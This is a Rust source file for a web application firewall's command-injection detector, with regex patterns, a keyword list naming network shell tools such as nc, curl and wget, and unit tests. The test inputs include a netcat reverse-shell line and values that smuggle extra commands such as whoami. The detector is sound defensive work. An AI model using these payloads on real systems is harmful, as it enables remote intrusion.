//! Command Injection Detector
//!
//! Detects OS command injection attacks.
//!
//! ## Detection Patterns
//!
//! 1. **Pipe operator**: `|` for command chaining
//! 2. **Semicolon**: `;` for command separator
//! 3. **Backtick substitution**: `` `command` ``
//! 4. **Shell substitution**: `$(command)`
//! 5. **Redirection**: `>`, `<`, `&>`
//! 6. **Logical operators**: `&&`, `||`
//!
//! ## Dangerous Commands
//!
//! Detects attempts to execute:
//! - Network tools: `curl`, `wget`, `nc`
//! - Shells: `bash`, `sh`, `cmd`, `powershell`
//! - Scripting: `python`, `perl`, `php`
//!
//! ## Confidence Scoring
//!
//! - 0.95: Command substitution with dangerous command
//! - 0.85: Backtick or $() with command context
//! - 0.80: Pipe with command-like context
//! - 0.70: Semicolon in request parameter
//! - 0.6: Redirection operators
//!
//! ## Use Cases
//!
//! - RCE (Remote Code Execution) vulnerabilities
//! - Shell injection through web inputs
//! - Command chaining for multi-step attacks

use regex::Regex;
use waf_common::*;

/// Command injection detection result
#[derive(Debug, Clone)]
pub struct CommandInjectionResult {
    pub detected: bool,
    pub pattern: String,
    pub matched_value: String,
    pub confidence: f32,
}

/// Command Injection Detector
pub struct CommandInjectionDetector {
    patterns: Vec<(Regex, &'static str, f32)>,
    /// Shell metacharacters to detect
    shell_metacharacters: Vec<char>,
}

impl CommandInjectionDetector {
    /// Create a new command injection detector
    pub fn new() -> Self {
        let patterns = vec![
            // Pipe operator (command chaining)
            (Regex::new(r"\|").unwrap(), "pipe_operator", 0.8),
            // Semicolon (command separator)
            (Regex::new(r";").unwrap(), "semicolon", 0.7),
            // Backtick command substitution
            (
                Regex::new(r"`[^`]+`").unwrap(),
                "backtick_substitution",
                0.85,
            ),
            // $() command substitution
            (
                Regex::new(r"\$\([^)]+\)").unwrap(),
                "dollar_substitution",
                0.85,
            ),
            // Common dangerous commands
            (
                Regex::new(r"(?i)\b(curl|wget|nc|netcat|bash|sh|cmd|powershell|python|perl|php)\b")
                    .unwrap(),
                "dangerous_command",
                0.75,
            ),
            // Redirection operators
            (Regex::new(r"[><]&?\d?").unwrap(), "redirection", 0.6),
            // AND/OR operators in shell context
            (Regex::new(r"&&|\|\|").unwrap(), "logical_operators", 0.8),
        ];

        let shell_metacharacters = vec![
            '|', ';', '&', '$', '`', '<', '>', '*', '?', '~', '#', '[', ']', '{', '}', '(', ')',
            '!', '\\', '/', '\'', '"',
        ];

        Self {
            patterns,
            shell_metacharacters,
        }
    }

    /// Detect command injection in input
    pub fn detect(&self, input: &str) -> CommandInjectionResult {
        // Check for command patterns
        for (regex, pattern_name, confidence) in &self.patterns {
            if let Some(m) = regex.find(input) {
                // Special handling for certain patterns
                if pattern_name == "pipe_operator" || pattern_name == "semicolon" {
                    // Check if it looks like shell command context
                    let trimmed = input.trim();
                    if trimmed.contains(' ') || trimmed.contains('/') {
                        return CommandInjectionResult {
                            detected: true,
                            pattern: pattern_name.to_string(),
                            matched_value: m.as_str().to_string(),
                            confidence: *confidence,
                        };
                    }
                    continue;
                }

                return CommandInjectionResult {
                    detected: true,
                    pattern: pattern_name.to_string(),
                    matched_value: m.as_str().to_string(),
                    confidence: *confidence,
                };
            }
        }

        // Check for high concentration of shell metacharacters
        let meta_count = input
            .chars()
            .filter(|c| self.shell_metacharacters.contains(c))
            .count();
        let total_chars = input.len();

        if total_chars > 0 && meta_count > 0 {
            let ratio = meta_count as f32 / total_chars as f32;
            if ratio > 0.3 && meta_count >= 3 {
                return CommandInjectionResult {
                    detected: true,
                    pattern: "high_metachar_density".to_string(),
                    matched_value: input.to_string(),
                    confidence: 0.7,
                };
            }
        }

        CommandInjectionResult {
            detected: false,
            pattern: String::new(),
            matched_value: String::new(),
            confidence: 0.0,
        }
    }

    /// Detect command injection in URL query parameters
    pub fn detect_in_url(&self, url: &str) -> CommandInjectionResult {
        // Check for common command injection patterns in URLs
        let dangerous_patterns = [
            "|curl ", "|wget ", ";curl ", ";wget ", "`curl ", "`wget ", "$(curl ", "$(wget ",
        ];

        let url_lower = url.to_lowercase();
        for pattern in dangerous_patterns {
            if url_lower.contains(pattern) {
                return CommandInjectionResult {
                    detected: true,
                    pattern: "command_injection".to_string(),
                    matched_value: pattern.to_string(),
                    confidence: 0.9,
                };
            }
        }

        self.detect(url)
    }
}

impl Default for CommandInjectionDetector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pipe_operator_detection() {
        let detector = CommandInjectionDetector::new();

        let result = detector.detect("google.com | whoami");
        assert!(result.detected);
        assert_eq!(result.pattern, "pipe_operator");
    }

    #[test]
    fn test_command_substitution_detection() {
        let detector = CommandInjectionDetector::new();

        let result = detector.detect("$(whoami)");
        assert!(result.detected);
        assert_eq!(result.pattern, "dollar_substitution");
    }

    #[test]
    fn test_semicolon_detection() {
        let detector = CommandInjectionDetector::new();

        let result = detector.detect("127.0.0.1; ls -la");
        assert!(result.detected);
    }

    #[test]
    fn test_dangerous_command_detection() {
        let detector = CommandInjectionDetector::new();

        let result = detector.detect("|nc -e /bin/bash 192.168.1.1 4444");
        assert!(result.detected);
    }

    #[test]
    fn test_normal_input() {
        let detector = CommandInjectionDetector::new();

        let result = detector.detect("Hello world!");
        assert!(!result.detected);
    }
}
